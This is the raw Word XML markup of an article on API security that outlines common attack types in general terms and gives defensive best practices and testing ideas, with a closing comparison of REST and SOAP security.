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2F5" w:rsidRPr="00790A44" w:rsidRDefault="00D252F5" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="300" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="lowKashida"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>APIs are transforming the way we buil</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">d applications and deliver business value. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Organisations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> can tap into new revenue streams by productizing their service capabilities through APIs. However, with the growing use of APIs also come new security risks. APIs represent gateways into our systems, and security vulnerabilities in our APIs can open </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>organisations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> to different forms of attacks. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C44B55" w:rsidRPr="00790A44" w:rsidRDefault="00C44B55" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:before="0"/>
        <w:jc w:val="lowKashida"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="213343"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Why API Security Is Important</w:t>
      </w:r>
      <w:r w:rsidR="00CE2D05" w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="213343"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve">? </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
        <w:t>While </w:t>
      </w:r>
      <w:hyperlink r:id="rId5" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>cybersecurity</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
        <w:t> is a broad topic that encompasses all online technologies, APIs present unique challenges.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C44B55" w:rsidRPr="00790A44" w:rsidRDefault="00C44B55" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="lowKashida"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
        <w:t>APIs sit between third-party developers and a company’s resources. These security breaches can harm applications and users, as a hacked endpoint grants direct access to sensitive information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C44B55" w:rsidRPr="00790A44" w:rsidRDefault="00C44B55" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="lowKashida"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:color w:val="213343"/>
        </w:rPr>
        <w:t>While the financial impact can be substantial, the damage to your brand may be irreparable. You’ll surely lose customer trust and credibility using your API. Third-party integrated apps may even be harmed by extension.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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>efore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> we review the best practices to harden your API, we need to know what we’re up against. Here are the most common attacks against APIs that you should know.</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Stolen Authentication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One of the simplest ways to access an API is to hijack the identity of an authorized user. For example, if an authentication token falls into the wrong hands, it can be used to access resources with malicious intent while appearing legitimate.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Cybercriminals will try to guess authentication passwords or break a weak authentication process to gain access.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Man-in-the-Middle Attack</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 man-in-the-middle (MITM) attack occurs when a hacker intercepts a request or response between an end user and an API. They may steal the contents of this communication (e.g., login credentials or payment information) or modify the contents of the request/response.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Code Injections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APIs with gaps in authentication and validation are also vulnerable to code injections, in which an attacker sends a script to an application’s server via an API request. This script is intended to expose or delete data, plant false information, and/or harm the application’s internals.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You’ll also see the term “SQL injection” used. This code injection is performed on a SQL database.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Denial-of-Service Attack</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Denial-of-service (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) attacks overwhelm a server’s resources with API requests to slow, break, or crash the web server. Often, these attacks are made from multiple malicious sources simultaneously — a distributed denial-of-service (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) attack.</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Security Best Practices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Despite these risks, APIs aren’t going away any time soon. Virtually any online application seeking to integrate with others will need APIs.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Every new API presents another opportunity for hackers to exploit personal data. Therefore, anyone overseeing software integration should understand API security measures. These best practices can help protect sensitive data from cyber-attacks and unauthorized access.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1. Implement authentication and authorization.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The first line of defense against unauthorized access is to implement an authentication system that requires users to provide valid credentials before they can access any data. Authorization is also important, as it dictates what level of access each user has to specific information.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Authentication and authorization safeguard users from unauthorized access.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All applications that involve sensitive data or require user authentication.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Pro tip: Enable two-factor authentication (2FA) to provide an extra layer of security to ensure that </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> authorized people can access the system.</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2. Use SSL/TLS encryption.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All communications between APIs and clients should be secured through an SSL connection or TLS encryption protocol like HTTPS. This ensures that all data sent over the wire is encrypted and kept safe from malicious third parties.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SSL/TLS encryption provides an extra layer of security to protect data in transit.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application that sends sensitive data over the wire or stores private user information.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Ensure your web applications use the latest and most secure version of HTTPS with TLS 1.3 protocol enabled to maximize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3. Implement rate limiting.</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protect against malicious automated attacks, you should implement rate limiting on your API calls. This will ensure that requests are promptly processed, and no one user can overwhelm the system with too many requests at once.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What we like: Rate limiting protects against malicious automated attacks.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web application or API that receives multiple requests from the same user quickly.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Set up rate limits tailored to your system's needs and adjust them depending on usage patterns.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4. Use auditing and logging.</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It's essential to keep track of what users are accessing and what they’re doing with that information. Make sure to log every API request, and keep audit logs of user activity to ensure data security and compliance.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Auditing and logging help to keep track of user activity and prevent data breaches or non-compliance issues.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system that stores or transmits confidential information or personal data.</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Pro tip: Make sure you have a comprehensive auditing and logging policy in place — and ensure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>it’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> reviewed and updated regularly to keep up with the latest security threats.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Everything you need to know about the history and use of APIs.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5. Restrict access to sensitive data.</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If possible, restrict access to sensitive data such as banking information or health records. This can be done through authorization policies or by encrypting the data before it’s transmitted over the network.</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Restricting access to sensitive data is a great way to protect against potential data theft or misuse.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systems that handle important personal or financial information.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Evaluate different methods such as authorization policies, encryption, tokenization, etc., and use the one that works best for your application needs.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6. Monitor and alert on anomalous activity.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Set up a system to monitor user behavior and alert you if suspicious activity is detected, such as multiple failed attempts to access a certain endpoint. This will help you detect and stop malicious activities before they become a bigger issue.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What we like: Setting up a system to monitor user behavior and alert you of suspicious activities can help you detect and stop malicious attacks before they become a bigger issue.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web application that requires authentication or carries sensitive data.</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Use automated tools to scan your systems regularly and set up alerts for any unusual activity. Enhance your system security by leveraging popular vulnerability scanners through automated tools.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7. Update regularly and patch vulnerabilities quickly.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Make sure to keep your APIs up-to-date with the latest security patches, as well as any new features or bug fixes that may be released. This can help prevent attackers from exploiting any known vulnerabilities.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Keeping your APIs up-to-date ensures that all known vulnerabilities are patched, which can help protect against potential attackers.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applications that have regular updates or bug fixes released.</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Stay on top of the latest security updates and make sure they’re applied as soon as they become available.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8. Use API gateways.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gateways can help protect your APIs from malicious attacks by acting as a “gatekeeper” between the client and the API. It will filter out any suspicious requests and block them before they reach their destination.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API gateways act as “gatekeepers” between the client and the server, protecting against malicious attacks before they reach their destination.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application that receives a large number of requests from outside sources.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Choose an API gateway with advanced filtering capabilities to maximize protection against potential threats.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9. Secure storage and encryption of data at rest.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Any data that’s stored locally should be encrypted to prevent unauthorized access. This includes any backups or snapshots of your data that may be taken.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we like: Ensuring that all data stored locally is encrypted prevents access from unauthorized individuals or programs.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Best for: Any application where sensitive data is stored in local databases or backups.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Make sure you use multiple layers of encryption when storing confidential information to maximize data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10. Use a Web Application Firewall (WAF).</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A WAF is a piece of security software that sits between your API and the internet, filtering out any malicious traffic before it reaches your server. It’s a great way to protect against </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacks and other malicious activities.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Best for: Any web application or API facing external traffic, such as those exposed via public websites or mobile apps.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Pro tip: Select a WAF that can be easily customized to your specific needs — allowing you to set different levels of security based on different access points or user roles within the system. Then, make sure your WAF is regularly updated to ensure the latest security patches are applied—keeping your data and applications secure.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Ensure all the above best practices are implemented throughout your entire application stack, not just the API layer. This will ensure comprehensive security for all your data, regardless of where it resides.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Security Testing</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The first step of API security is ensuring your API works as expected. That means submitting regular requests via an API Client and ensuring they stick to the above principles. Develop scenarios that answer the following:</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Can only authenticated users access your endpoints?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Are users granted access to only the necessary endpoints based on their roles?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Is the correct information returned in responses for each potential request?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Are benign but invalid requests rejected?</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Once you've established that your API works normally, you’ll need to simulate code injection, MITM, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and stolen password attacks against your systems in a proper testing environment. Address the following in your tests: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Can my authentication counter brute-force entry attempts?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How does my API handle significant spikes in requests?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if an authenticated user submits a harmful script or file via a request?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Are all data transfers encrypted? Are requests without TLS/SSL (i.e., with HTTP and not HTTPS) prohibited?</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What if a request or response is intercepted? How will my API and the user know?</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Below are some specific tests you can run.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User Authentication Test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If authentication mechanisms are implemented incorrectly, attackers can compromise authentication tokens or exploit implementation flaws to assume other users’ identities and gain access to your API’s endpoints.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test your authentication mechanisms, try sending API requests without proper authentication. See if your API responds with the correct error and messaging. Try this test with both no credentials and incorrect ones.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Parameter Tampering Test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run a parameter tampering test, try various combinations of invalid query parameters in your API requests and see if it responds with the correct error codes. If not, your API likely has some backend validation errors that must be resolved.</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Injection Test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Try injecting SQL, NoSQL, LDAP, OS, or other commands in API inputs. Then, see if your API executes them. These commands should be harmless, like reboot commands or cat commands.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Everything you need to know about the history and use of APIs.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Most APIs have various HTTP methods to retrieve, store, or delete data. Sometimes web servers will give access to unsupported HTTP methods by default, which makes your API vulnerable.</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test for this vulnerability, try all the standard HTTP methods (POST, GET, PUT, PATCH, and DELETE) and a few uncommon ones.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Send an API request with the HEAD verb instead of GET, for example, or a request with an arbitrary method like FOO. You should get an error code. If you get a 200 OK response, your API has a vulnerability.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Fuzz Test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Fuzz testing should be one of the last steps of your API security auditing process. This type of testing pushes your API to its limits to discover any security issues that have yet to be revealed.</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achieve this, send a large number of randomized requests, including SQL queries, system commands, arbitrary numbers, and other non-text characters. Then, see if your API responds with errors, processes any of these inputs incorrectly, or crashes.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This type of testing will mimic Overflow and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacks.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An API manager or gateway tool will handle or help address the API security guidelines described above (including testing). Let's take a closer look at these tools below.</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Security Management</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With an API management platform, you can secure all your APIs and endpoints across environments and vendors in one place. You can also automate parts of the API security process by assigning pre-configured security authentication profiles, creating and customizing policies that can be used to secure all APIs or individual ones, and so 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Arguably, the most important function of API management platforms is access control. They should prevent unauthorized users from gaining inappropriate levels of access to your API’s services and data.</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enforce access control, most API management platforms support at least one or all three types of security schemes outlined below:</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key. A single token string that provides unique authentication information.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Basic authentication. A two-token string solution, like a username and password, that provides unique authentication information.</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>OpenID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Connect (OIDC): A simple identity layer on top of the OAuth framework, which verifies users by obtaining basic profile information, for example, and using an authentication server.</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To discover some popular API management platforms that can help you secure your APIs, check out What Is an API Gateway &amp; How Does It Work? [+Best Service Providers].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The focus of this post has been on REST APIs since they account for approximately 83% of APIs today, but any API is at risk for security breaches. That's why we'll go over the key differences between REST API security and the security of another common API type: SOAP.</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REST API Security vs. SOAP API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Software developers may follow different architectures to build an API. The most popular are Representational State Transfer (REST) and Simple Object Access Protocol (SOAP).</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lastRenderedPageBreak/>
        <w:t>REST APIs transfer data via the Hypertext Transfer Protocol (HTTP). Meanwhile, SOAP encodes data in XML — a common markup language for storing and transferring information — and sends it via HTTP.</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SOAP is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>more strict</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in its requirements than RESTful design, making this API type more challenging to build. However, it also tends to be more secure and better at preserving data integrity than other API designs.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RESTful API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The RESTful protocol supports SSL to protect data when transferred but lacks built-in security capabilities, including error handling. It also does not support the Web Services (WS) specifications, so you can’t use security extensions like Web Services Security for enterprise-grade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That means the security of REST APIs depends on the design of the API itself or an API gateway.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SOAP API security</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Like RESTful, the SOAP protocol also supports SSL to protect data when transferred, but it goes further.</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Not only does it include SAML tokens, XML encryption, and XML signatures (based on W3C and OASIS recommendations), which help secure the data being sent and received by SOAP APIs — it also supports the Web Services (WS) specifications.</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This lets you use security extensions like Web Services Security for enterprise-grade security and WS-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ReliableMessaging</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, which provides built-in error handling.</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 xml:space="preserve">Protect Your Users </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>By</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Protecting Your API</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AD3BE1" w:rsidRPr="00AD3BE1"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API technology brings a myriad of possibilities to online applications, but a security incident can quickly eclipse any benefits you get from an API. While it’s impossible to eradicate all threats, the principles above are necessary for any organization that cares about its reputation and, more importantly, its customers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C44B55" w:rsidRPr="00790A44" w:rsidRDefault="00AD3BE1"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AD3BE1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Editor's note: This post was originally published in December 2020 and has been updated for comprehensiveness.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="0080304A" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="300" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="lowKashida"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0080304A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>API Security Risks</w:t>
      </w:r>
      <w:r w:rsidR="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:spacing w:val="-2"/>
          <w:kern w:val="36"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="0080304A">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
